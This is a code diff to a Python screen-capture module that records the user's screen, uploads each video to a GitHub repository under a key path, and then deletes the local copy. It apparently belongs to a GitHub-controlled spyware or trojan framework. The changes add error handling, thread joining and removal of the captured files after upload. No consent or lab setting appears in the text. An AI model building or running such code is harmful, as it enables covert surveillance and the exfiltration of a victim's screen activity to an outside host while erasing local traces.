@@ -2,10 +2,8 @@ import cv2
 import github3
 #* pip install github3.py
 import os
-from PIL import Image
 import pyautogui
 import queue
-import random
 import socket 
 import threading
 
@@ -134,22 +132,29 @@ class GithubUpload:
 
     def store_result(self, video_path):
         sleep(.25)
-        with open(video_path, 'rb') as file:
-            filename = video_path.split('/')
-            filename =  filename[2]
-            data = file.read()
-            remote_path = f'{REP_KEY_PTH}/{filename}'   
-            #! Changed this line to store an mp4 file
-            bindata = bytes(data)
+
+        try:
+            with open(video_path, 'rb') as file:
+                filename = video_path.split('/')
+                filename =  filename[2]
+                data = file.read()
+                remote_path = f'{REP_KEY_PTH}/{filename}'   
+                bindata = bytes(data)
+        except Exception as e:
+            print(f'Read video error: {e}')
 
         try:
             self.repo.create_file(remote_path, filename, bindata)
             print(f'File: {filename} created')
             #? This is the remote_path in the GitHub repo not on the local machine
             #* https://docs.github.com/en/rest/repos/contents?apiVersion=2022-11-28#create-a-file
-            #? base64 encoded
         except Exception as e:
             print(f'Error in store_module_result: {e}')
+
+        try:
+            os.remove(video_path)
+        except Exception as e:
+            print(f'Video file clean up error: {e}')
 
 
 def run(**args):
@@ -160,9 +165,9 @@ def run(**args):
         try:
             screen_thread = threading.Thread(target=sc.getScreen)
             screen_thread.start()
-            print(f'Threads: {threading.active_count()}')
+            print(f'Screen Thread Started: {threading.active_count()}')
         except Exception as e:
-            print(f'Get Screen Exception: {e}')
+            print(f'Screen Capture Exception: {e}')
 
         videos = sc.getVideoQueue()
         video_path = videos.get()
@@ -170,9 +175,10 @@ def run(**args):
         try:
             upload_thread = threading.Thread(target=gu.store_result, args=(video_path,))
             upload_thread.start()
-            print(f'Threads: {threading.active_count()}')
+            print(f'Store Result Thread Started: {threading.active_count()}')
+            upload_thread.join()
         except Exception as e:
-            print(f'Exception: {e}')
+            print(f'Store Result Exception: {e}')
 
 
 if __name__ == '__main__':
